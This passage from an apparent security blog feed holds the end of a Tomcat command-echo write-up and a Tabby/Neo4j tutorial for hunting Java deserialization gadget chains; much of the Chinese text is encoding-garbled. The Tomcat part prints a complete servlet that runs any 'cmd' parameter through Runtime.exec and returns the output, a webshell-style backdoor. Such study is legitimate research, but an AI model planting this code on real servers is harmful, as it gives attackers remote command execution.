ˆä¸­è°ƒç”¨äº†<code>Http11Processor#service</code>æ–¹æ³•,è€Œ<code>Http11Processor</code>ç»§æ‰¿äº†<code>AbstractProcessor</code>ç±»ï¼Œè¿™é‡Œçš„responseå¯¹è±¡æ­£æ˜¯<code>AbstractProcessor</code>ç±»ä¸­çš„å±æ€§ï¼Œå› æ­¤æˆ‘ä»¬å¦‚æœèƒ½è·å–åˆ°<code>Http11Processor</code>ç±»ï¼Œå°±èƒ½è·å–åˆ°responseå¯¹è±¡</p><p>è°ƒç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">StandardService-----&gt;Connector-----&gt;Http11NioProtocol-----&gt;AbstractProtocol$ConnectoinHandler#process()-------&gt;<span class="hljs-built_in">this</span>.global--------&gt;RequestInfo-------&gt;Request--------&gt;Response<br></code></pre></td></tr></table></figure><p>å®Œæ•´poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.catalina.connector.Connector;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardService;<br><span class="hljs-keyword">import</span> org.apache.coyote.ProtocolHandler;<br><span class="hljs-keyword">import</span> org.apache.coyote.RequestGroupInfo;<br><span class="hljs-keyword">import</span> org.apache.coyote.RequestInfo;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;<br> <br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br> <br><span class="hljs-meta">@WebServlet(&quot;/response&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tomcat_Echo_Response</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br> <br>        <span class="hljs-comment">//è·å–StandardService</span><br>        org.apache.catalina.loader.<span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">webappClassLoaderBase</span> <span class="hljs-operator">=</span> (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();<br> <br>        System.out.println(standardContext);<br> <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//è·å–ApplicationContext</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">applicationContextField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(standardContext);<br> <br>            <span class="hljs-comment">//è·å–StandardService</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">standardServiceField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;service&quot;</span>);<br>            standardServiceField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">StandardService</span> <span class="hljs-variable">standardService</span> <span class="hljs-operator">=</span> (StandardService) standardServiceField.get(applicationContext);<br> <br>            <span class="hljs-comment">//è·å–Connector</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">connectorsField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardService&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;connectors&quot;</span>);<br>            connectorsField.setAccessible(<span class="hljs-literal">true</span>);<br>            Connector[] connectors = (Connector[]) connectorsField.get(standardService);<br>            <span class="hljs-type">Connector</span> <span class="hljs-variable">connector</span> <span class="hljs-operator">=</span> connectors[<span class="hljs-number">0</span>];<br> <br>            <span class="hljs-comment">//è·å–Handler</span><br>            <span class="hljs-type">ProtocolHandler</span> <span class="hljs-variable">protocolHandler</span> <span class="hljs-operator">=</span> connector.getProtocolHandler();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">handlerField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;handler&quot;</span>);<br>            handlerField.setAccessible(<span class="hljs-literal">true</span>);<br>            org.apache.tomcat.util.net.AbstractEndpoint.<span class="hljs-type">Handler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (AbstractEndpoint.Handler) handlerField.get(protocolHandler);<br> <br>            <span class="hljs-comment">//è·å–å†…éƒ¨ç±»AbstractProtocol$ConnectionHandlerçš„globalå±æ€§</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">globalHandler</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;global&quot;</span>);<br>            globalHandler.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">RequestGroupInfo</span> <span class="hljs-variable">global</span> <span class="hljs-operator">=</span> (RequestGroupInfo) globalHandler.get(handler);<br> <br>            <span class="hljs-comment">//è·å–processors</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">processorsField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;processors&quot;</span>);<br>            processorsField.setAccessible(<span class="hljs-literal">true</span>);<br>            List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);<br> <br>            <span class="hljs-comment">//è·å–requestå’Œresponse</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">requestField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;req&quot;</span>);<br>            requestField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">for</span> (RequestInfo requestInfo : requestInfoList)&#123;<br> <br>                <span class="hljs-comment">//è·å–org.apache.coyote.Request</span><br>                org.apache.coyote.<span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (org.apache.coyote.Request) requestField.get(requestInfo);<br> <br>                <span class="hljs-comment">//é€šè¿‡org.apache.coyote.Requestçš„Noteså±æ€§è·å–ç»§æ‰¿HttpServletRequestçš„org.apache.catalina.connector.Request</span><br>                org.apache.catalina.connector.<span class="hljs-type">Request</span> <span class="hljs-variable">http_request</span> <span class="hljs-operator">=</span> (org.apache.catalina.connector.Request) request.getNote(<span class="hljs-number">1</span>);<br>                org.apache.catalina.connector.<span class="hljs-type">Response</span> <span class="hljs-variable">http_response</span> <span class="hljs-operator">=</span> http_request.getResponse();<br> <br>                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> http_response.getWriter();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> http_request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br> <br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(inputStream).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> scanner.hasNext()?scanner.next():<span class="hljs-string">&quot;&quot;</span>;<br>                scanner.close();<br>                writer.write(result);<br>                writer.flush();<br>                writer.close();<br>            &#125;<br> <br> <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010922036.png" alt="image-20230201092245861"></p><h4 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h4><p><a href="https://su18.org/post/memory-shell/">JavaWeb å†…å­˜é©¬ä¸€å‘¨ç›®é€šå…³æ”»ç•¥ | ç´ åå…« (su18.org)</a></p><p><a href="https://xz.aliyun.com/t/7388#toc-2">åŸºäºtomcatçš„å†…å­˜ Webshell æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://goodapple.top/archives/1355">Javaå®‰å…¨å­¦ä¹ â€”â€”å†…å­˜é©¬ - æ«ã®Blog (goodapple.top)</a></p><p><a href="https://www.kingkk.com/2020/03/Tomcat%E4%B8%AD%E4%B8%80%E7%A7%8D%E5%8D%8A%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E6%96%B9%E6%B3%95/">Tomcatä¸­ä¸€ç§åŠé€šç”¨å›æ˜¾æ–¹æ³• - Kingkkâ€™s Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tabbyå®‰è£…é…ç½®åŠä½¿ç”¨</title>
      <link href="/2022/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7Tabby%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7Tabby%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Tabbyå®‰è£…é…ç½®åŠä½¿ç”¨"><a href="#Tabbyå®‰è£…é…ç½®åŠä½¿ç”¨" class="headerlink" title="Tabbyå®‰è£…é…ç½®åŠä½¿ç”¨"></a>Tabbyå®‰è£…é…ç½®åŠä½¿ç”¨</h1><h2 id="0x00å®‰è£…"><a href="#0x00å®‰è£…" class="headerlink" title="0x00å®‰è£…"></a>0x00å®‰è£…</h2><h3 id="Neo4j-Desktop"><a href="#Neo4j-Desktop" class="headerlink" title="Neo4j Desktop"></a>Neo4j Desktop</h3><p>å®˜ç½‘ç›´æ¥ä¸‹ <a href="https://neo4j.com/download/">Neo4j Desktop Download | Free Graph Database Download</a></p><p>ä¸‹å®Œæ‰“å¼€åˆå§‹åŒ–å®Œå¯ä»¥çœ‹åˆ°æ•°æ®åº“ç‰ˆæœ¬ï¼Œä¸‹å¯¹åº”ç‰ˆæœ¬çš„APOCæ’ä»¶ </p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321216.png" alt="image-20230501151304382"></p><h3 id="æ–°å»ºNeo4jå›¾æ•°æ®åº“"><a href="#æ–°å»ºNeo4jå›¾æ•°æ®åº“" class="headerlink" title="æ–°å»ºNeo4jå›¾æ•°æ®åº“"></a>æ–°å»ºNeo4jå›¾æ•°æ®åº“</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321510.png" alt="image-20230501152338340"></p><p>å¯ä»¥é€‰æ‹©æ›´æ–°æ•°æ®åº“ç‰ˆæœ¬åˆ°5.4.0</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321584.png" alt="image-20230501162942114"></p><p>æ‰“å¼€æ•°æ®åº“æ—çš„<code>Â·Â·Â·</code>-&gt;<code>Settings...</code>æ›´æ”¹ä»¥ä¸‹é…ç½®</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">#å…è®¸ä»æœ¬åœ°ä»»æ„ä½ç½®è½½å…¥csvæ–‡ä»¶(å¤§æ¦‚åœ¨å‰é¢å‡ è¡Œ)</span><br><span class="hljs-comment">#server.directories.import=import</span><br><span class="hljs-comment">#å…è®¸ apocæ‰©å±•ï¼ˆå¤§æ¦‚åœ¨é…ç½®æ–‡ä»¶æœ«å°¾éƒ¨åˆ†ï¼‰</span><br><span class="hljs-attr">dbms.security.procedures.unrestricted</span>=jwt.security.*,apoc.*<br><span class="hljs-comment"># ä¿®æ”¹å†…å­˜ç›¸å…³é…ç½® </span><br><span class="hljs-comment"># å¯ä»¥é€šè¿‡å®˜æ–¹çš„neo4j-adminæ¥æ¨èé…ç½®å†…å­˜å¤§å°</span><br><span class="hljs-attr">dbms.memory.heap.initial_size</span>=<span class="hljs-number">1</span>G<br><span class="hljs-attr">dbms.memory.heap.max_size</span>=<span class="hljs-number">4</span>G<br><span class="hljs-attr">dbms.memory.pagecache.size</span>=<span class="hljs-number">4</span>G<br></code></pre></td></tr></table></figure><p>é…ç½® apoc çš„é…ç½®ï¼Œéœ€è¦æ‰¾åˆ°é…ç½®æ–‡ä»¶ç›®å½•ï¼Œåœ¨è¿™ä¸ªç›®å½•ä¸‹æ–°å»º apoc.conf æ–‡ä»¶ï¼Œå†…å®¹ä¸º</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321995.png" alt="image-20230501161001178"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">apoc.import.file.enabled</span>=<span class="hljs-literal">true</span><br><span class="hljs-attr">apoc.import.file.use_neo4j_config</span>=<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>æœ€åï¼Œé…ç½®ä¸€ä¸‹ apoc å’Œ tabby æ’ä»¶ï¼Œæ‰“å¼€ plugins ç›®å½•å°†å¯¹åº”çš„ jar å¤åˆ¶åˆ°ä¸ä¸Šé¢confåŒç›®å½•ä¸‹çš„pluginsç›®å½•</p><p>tabbyæ’ä»¶ï¼š<a href="https://github.com/wh1t3p1g/tabby/releases">Releases Â· wh1t3p1g&#x2F;tabby Â· GitHub</a> ï¼ˆåœ¨envç›®å½•é‡Œ,åŒæ—¶æŠŠenvé‡Œé¢å‡ ä¸ªapocçš„jaråŒ…éƒ½<strong>å¤åˆ¶</strong>åˆ°pluginsé‡Œï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321885.png" alt="image-20230501163440727"></p><h3 id="éªŒè¯é…ç½®"><a href="#éªŒè¯é…ç½®" class="headerlink" title="éªŒè¯é…ç½®"></a>éªŒè¯é…ç½®</h3><p>é‡å¯æ•°æ®åº“åï¼Œopen-&gt;Neo4j Browser,æµ‹è¯•æŸ¥è¯¢è¯­å¥ï¼ŒæŸ¥çœ‹ä¸€ä¸‹apocï¼ˆæœ‰30é¡¹ï¼‰å’Œtabbyï¼ˆæœ‰ä¸¤é¡¹ï¼‰çš„é…ç½®</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321101.png" alt="image-20230501163735244"></p><h3 id="ç®€å•å¯åŠ¨"><a href="#ç®€å•å¯åŠ¨" class="headerlink" title="ç®€å•å¯åŠ¨"></a>ç®€å•å¯åŠ¨</h3><p>åœ¨ä¸‹è½½çš„tabbyæ–‡ä»¶å¤¹ä¸­æ–°å»ºä¸€ä¸ªcaseç›®å½•ï¼Œä¸‹é¢æ”¾ç›®æ ‡jar,åŒæ—¶ä¿®æ”¹config&#x2F;settings.properties</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321272.png" alt="image-20230501190832777"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321030.png" alt="image-20230501191148762"></p><p>ä½¿ç”¨jdk8å¯åŠ¨tabby.jarï¼Œå‘½ä»¤è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -Xmx6g -jar tabby.jar<br></code></pre></td></tr></table></figure><p>å¯èƒ½å‡ºç°çš„æŠ¥é”™</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">java.lang.IllegalStateException: Failed to execute CommandLineRunner<br>at org.springframework.boot.SpringApplication.callRunner(SpringApplication.java:771) [spring-boot-2.7.7.jar!/:2.7.7]<br>at org.springframework.boot.SpringApplication.callRunners(SpringApplication.java:752) [spring-boot-2.7.7.jar!/:2.7.7]<br>at org.springframework.boot.SpringApplication.run(SpringApplication.java:314) [spring-boot-2.7.7.jar!/:2.7.7]<br>at org.springframework.boot.SpringApplication.run(SpringApplication.java:1303) [spring-boot-2.7.7.jar!/:2.7.7]<br>at org.springframework.boot.SpringApplication.run(SpringApplication.java:1292) [spring-boot-2.7.7.jar!/:2.7.7]<br>at tabby.App.main(App.java:28) [classes!/:na]<br>at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_341]<br>at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_341]<br>at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_341]<br>....<br></code></pre></td></tr></table></figure><blockquote><p>æŠŠconfig&#x2F;settings.propertiesä¸­çš„<code>tabby.cache.isDockerImportPath</code>è®¾ç½®ä¸ºfalseï¼Œè¿™ä¸ªé€‰é¡¹ç”¨äºåˆ¤æ–­å½“å‰æ˜¯å¦æ˜¯dockerç¯å¢ƒ,å¦‚æœæ˜¯æœ¬æœºç›´æ¥ä½¿ç”¨ï¼Œè¦è®¾ç½®æˆfalse</p></blockquote><h3 id="å›¾æ•°æ®åº“ç´¢å¼•é…ç½®"><a href="#å›¾æ•°æ®åº“ç´¢å¼•é…ç½®" class="headerlink" title="å›¾æ•°æ®åº“ç´¢å¼•é…ç½®"></a>å›¾æ•°æ®åº“ç´¢å¼•é…ç½®</h3><p>å¯ä»¥åŠ å¿«å¯¼å…¥&#x2F;åˆ é™¤çš„é€Ÿåº¦ï¼Œåªè¦åœ¨Neo4j browseré‡Œè¿è¡Œå³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cql">CREATE CONSTRAINT c1 IF NOT EXISTS FOR (c:Class) REQUIRE c.ID IS UNIQUE;<br>CREATE CONSTRAINT c2 IF NOT EXISTS FOR (c:Class) REQUIRE c.NAME IS UNIQUE;<br>CREATE CONSTRAINT c3 IF NOT EXISTS FOR (m:Method) REQUIRE m.ID IS UNIQUE;<br>CREATE CONSTRAINT c4 IF NOT EXISTS FOR (m:Method) REQUIRE m.SIGNATURE IS UNIQUE;<br>CREATE INDEX index1 IF NOT EXISTS FOR (m:Method) ON (m.NAME);<br>CREATE INDEX index2 IF NOT EXISTS FOR (m:Method) ON (m.CLASSNAME);<br>CREATE INDEX index3 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.CLASSNAME);<br>CREATE INDEX index4 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.NAME0);<br>CREATE INDEX index5 IF NOT EXISTS FOR (m:Method) ON (m.SIGNATURE);<br>CREATE INDEX index6 IF NOT EXISTS FOR (m:Method) ON (m.NAME0);<br>CREATE INDEX index7 IF NOT EXISTS FOR (m:Method) ON (m.NAME0, m.CLASSNAME);<br>#ä¹‹åå¯ä»¥è¿è¡Œä¸‹é¢å‘½ä»¤æ¥æŸ¥çœ‹è¡¨åº“å’Œæ•°æ®åº“ä¿¡æ¯<br>:schema <br>:sysinfo <br></code></pre></td></tr></table></figure><h2 id="0x01ç®€å•ä½¿ç”¨"><a href="#0x01ç®€å•ä½¿ç”¨" class="headerlink" title="0x01ç®€å•ä½¿ç”¨"></a>0x01ç®€å•ä½¿ç”¨</h2><h3 id="CCé“¾"><a href="#CCé“¾" class="headerlink" title="CCé“¾"></a>CCé“¾</h3><p>ä»¥æ‰¾ccé“¾ä¸ºä¾‹ï¼Œå°†tabbyç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶çš„tabby.build.targetè¯¥æˆcommons-collections jaræ‰€åœ¨ä½ç½®</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322228.png" alt="image-20230504085113381"></p><p>shellè¿è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -Xmx6g -jar tabby.jar<br></code></pre></td></tr></table></figure><blockquote><p>æ³¨æ„è¦ä½¿ç”¨java8</p></blockquote><p>æˆåŠŸè¿æ¥æ•°æ®åº“</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322970.png" alt="image-20230504085210709"></p><h3 id="å¯èƒ½çš„æŠ¥é”™"><a href="#å¯èƒ½çš„æŠ¥é”™" class="headerlink" title="å¯èƒ½çš„æŠ¥é”™"></a>å¯èƒ½çš„æŠ¥é”™</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322071.png" alt="image-20230504085257308"></p><blockquote><p>åŸå› ï¼šNeo4jæ•°æ®åº“æœªå¼€å¯ï¼Œå³ä½¿æ•°æ®åº“æœªå¼€å¯ï¼Œåˆšå¼€å§‹çš„infoä»æ˜¾ç¤ºæœ‰â€defaultâ€æ•°æ®åº“</p></blockquote><p>å‡ºç°ä¸‹å›¾å³è¡¨ç¤ºå¯¼å…¥å®Œæ¯•</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322896.png" alt="image-20230504085512803"></p><h3 id="æŸ¥è¯¢"><a href="#æŸ¥è¯¢" class="headerlink" title="æŸ¥è¯¢"></a>æŸ¥è¯¢</h3><p>æ‰“å¼€Neo4j browserï¼Œç”¨ä»¥ä¸‹è¯­å¥æŸ¥è¯¢CC7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cql">match path=(m1:Method &#123;SIGNATURE:&quot;&lt;java.util.Hashtable: void readObject(java.io.ObjectInputStream)&gt;&quot;&#125;)-[:CALL ]-&gt;(m2:Method &#123;NAME:&quot;reconstitutionPut&quot;&#125;)-[:CALL ]-&gt;(m3:Method &#123;NAME:&quot;equals&quot;&#125;)-[:ALIAS*..2]-(m4:Method)-[:CALL ]-&gt;(m5:Method &#123;NAME:&quot;get&quot;&#125;)-[:ALIAS*1..2]-(m6:Method &#123;NAME:&quot;get&quot;&#125;)-[:CALL]-&gt;(m7:Method &#123;NAME:&quot;transform&quot;&#125;)-[:ALIAS*]-(m8:Method)-[:CALL]-&gt;(m9:Method &#123;IS_SINK:true&#125;)  return path<br></code></pre></td></tr></table></figure><blockquote><p>å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°æ˜¯ä»Hashtableçš„readObjectä¸ºèµ·ç‚¹ï¼Œhashtableååºåˆ—åŒ–æ—¶è°ƒç”¨<strong>reconstitutionPutæ–¹æ³•</strong>ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•çš„æ‰§è¡Œæµç¨‹ä¸­ä¼šè°ƒç”¨equalsåˆ¤æ–­keyæ˜¯å¦é‡å¤ï¼Œå¦‚æœè°ƒç”¨çš„æ˜¯AbstractMapçš„equalsï¼Œä¹‹åä¼šè§¦å‘LazyMapçš„getï¼Œä¹‹åå°±æ˜¯å¸¸è§„çš„è§¦å‘transform</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322187.png" alt="image-20230504091827921"></p><blockquote><p>æŸ¥è¯¢ç»“æœèŠ‚ç‚¹ä»¥idæ˜¾ç¤ºï¼Œç‚¹å‡»åå¯ä»¥åœ¨å³æ¡†æŸ¥çœ‹å±æ€§</p></blockquote><h4 id="è¯­æ³•åˆ†æ"><a href="#è¯­æ³•åˆ†æ" class="headerlink" title="è¯­æ³•åˆ†æ"></a>è¯­æ³•åˆ†æ</h4><ul><li><p>Neo4jä¸­æœ‰ä¸‰ç§æŒ‡å‘ï¼š<code>() - [] -&gt; ()</code>ã€<code>() &lt;- [] - ()</code>å’Œ<code>() - [] - ()</code>ã€‚é¡¾åæ€ä¹‰ï¼Œå‰ä¸¤ç§å°±æ˜¯çœ‹ç®­å¤´æ–¹å‘è¡¨ç¤ºå¯¹åº”çš„å•é¡¹å…³ç³»ï¼›æœ€åä¸€ç§è¡¨ç¤ºåŒå‘å…³ç³»</p></li><li><p>å½¢å¦‚<code>[:CALL]</code>çš„å¯ä»¥è®¤ä¸ºç»™è°ƒç”¨è¾¹èµ·ä¸€ä¸ªåˆ«åCALL</p></li><li><p>å¯¹äºæ¯ä¸ªèŠ‚ç‚¹ï¼ŒSIGNATUREå±æ€§å­˜å‚¨ç€å®Œæ•´çš„æ–¹æ³•åç§°</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322332.png" 